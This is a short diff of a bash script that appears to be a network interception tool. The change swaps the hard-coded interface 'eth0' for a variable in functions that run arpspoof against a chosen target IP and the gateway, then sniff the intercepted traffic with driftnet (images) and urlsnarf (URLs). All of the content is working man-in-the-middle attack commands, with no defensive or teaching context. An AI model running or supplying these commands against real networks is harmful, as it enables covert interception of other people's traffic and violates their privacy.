@@ -63,21 +63,21 @@ function trafficSelectedIp {
 
 function interceptPackages {
   printf " Intercepting pacakages\n\n"
-  xterm -e arpspoof -i eth0 -t $targetIPAddress -r $defaultGateway &
+  xterm -e arpspoof -i $defaultInterface -t $targetIPAddress -r $defaultGateway &
 
 }
 
 function inverseInterceptPackages {
-  xterm -e arpspoof -i eth0 -t $defaultGateway $targetIPAddress &
+  xterm -e arpspoof -i $defaultInterface -t $defaultGateway $targetIPAddress &
 }
 
 function checkImages {
-  cmd3=("driftnet -i eth0")
+  cmd3=("driftnet -i "$defaultInterface)
 
   $cmd3 &
 }
 
 function snifNetwork {
-  urlsnarf -i eth0 > /dev/null
+  urlsnarf -i $defaultInterface > /dev/null
 }
 
